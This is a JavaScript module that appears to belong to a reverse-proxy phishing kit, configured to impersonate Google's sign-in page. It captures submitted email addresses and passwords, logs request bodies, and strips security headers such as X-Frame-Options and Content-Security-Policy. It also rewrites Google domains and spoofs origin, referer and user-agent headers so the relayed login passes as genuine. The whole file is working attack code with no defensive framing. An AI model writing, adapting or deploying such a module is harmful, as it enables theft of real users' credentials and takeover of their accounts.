/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        // Simple approach like working services - let the base class handle captures
        console.log('Gmail processRequest called for:', this.browserReq.url)
        console.log('Gmail request method:', this.browserReq.method)
        console.log('Gmail request headers:', this.browserReq.headers)
        
        // If this is a POST request to the identifier endpoint, we need to handle it specially
        if (this.browserReq.method === 'POST' && this.browserReq.url.includes('/v3/signin/identifier')) {
            console.log('Gmail POST request to identifier endpoint detected')
            
            // Log the request body to see what's being sent
            let body = ''
            this.browserReq.on('data', (chunk) => {
                body += chunk.toString()
            })
            this.browserReq.on('end', () => {
                console.log('Gmail POST request body:', body)
            })
            
            // Let the base class handle it but with special logging
            return super.processRequest()
        }
        
        return super.processRequest()
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: '/playboy',
            },
            {
               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
               replacement: '/CheckConnection',
            },
           {
               reg: /name="checkConnection" value/gi,
               replacement: 'name="checkConnection" value="youtube:1052:1"',
           },
           {
               reg: /signaler-pa.googleapis.com/gi,
               replacement: 'localhost',
           }
        ]
    }

    processResponse(clientContext) {
        // Simple response handling like working services
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        // Log response status for debugging
        console.log('Gmail response status:', this.proxyResp.statusCode)
        console.log('Gmail response headers:', this.proxyResp.headers)

        // Handle Gmail redirects properly
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
            console.log('Gmail redirect detected:', rLocation)
            
            // Handle redirects to password challenge form
            if (rLocation.includes('/v3/signin/challenge/pwd')) {
                console.log('Redirecting to password challenge form')
                this.browserEndPoint.setHeader('location', rLocation.replace('https://accounts.google.com', ''))
                this.browserEndPoint.statusCode = 302
                return this.browserEndPoint.end('')
            }
            
            // Handle successful login redirects
            if (rLocation.startsWith('https://myaccount.google.com/')) {
                this.browserEndPoint.setHeader('location', '/auth/login/finish')
                this.browserEndPoint.statusCode = 302
                return this.browserEndPoint.end('')
            }
        }

        return super.processResponse(clientContext)
    }

    concludeAuth() {
        console.log('logged in fine please')
    }
}

const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        // Set proper headers for Gmail like working services do
        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
        
        // Ensure origin and referer point to accounts.google.com for Gmail
        this.req.headers['origin'] = 'https://accounts.google.com'
        this.req.headers['referer'] = 'https://accounts.google.com/'
        
        // Remove any proxy-specific headers that might confuse Gmail
        delete this.req.headers['x-forwarded-for']
        delete this.req.headers['x-forwarded-proto']
        delete this.req.headers['x-real-ip']
        
        console.log('Gmail request URL:', this.req.url)
        console.log('Gmail request method:', this.req.method)
        console.log('Gmail request headers:', this.req.headers)
        
        // For POST requests, ensure content-type is set correctly
        if (this.req.method === 'POST') {
            this.req.headers['content-type'] = 'application/x-www-form-urlencoded'
            console.log('Gmail POST request - content-type set to application/x-www-form-urlencoded')
        }
        
        return super.execute(clientContext)
    }
}

const configExport = {
    SCHEME: 'gmail',

    CURRENT_DOMAIN: 'accounts.google.com',

    AUTOGRAB_CODE: 'identifier',

    START_PATH: '/v3/signin/identifier?hl=en',

    COOKIE_PATH: ['/v3/signin/identifier', '/v3/signin/challenge/pwd'],

    EXIT_TRIGGER_PATH: [],

    EXIT_URL: 'https://myaccount.google.com/',

    EXTRA_COMMANDS: [
        
        {
            path: '/recaptcha/releases.*',
            command: 'CHANGE_DOMAIN',
            command_args: {
                new_domain: 'www.gstatic.com',
                persistent: false,
                },
        },

    ],


    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,



    CAPTURES: {
        gmailEmail: {
            method: 'POST',
            params: ['identifier'],
            urls: '',
            hosts: ['accounts.google.com'],
        },

        gmailPassword: {
            method: 'POST',
            params: ['password', 'hiddenPassword'],
            urls: '',
            hosts: ['accounts.google.com'],
        },
    },

    //MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport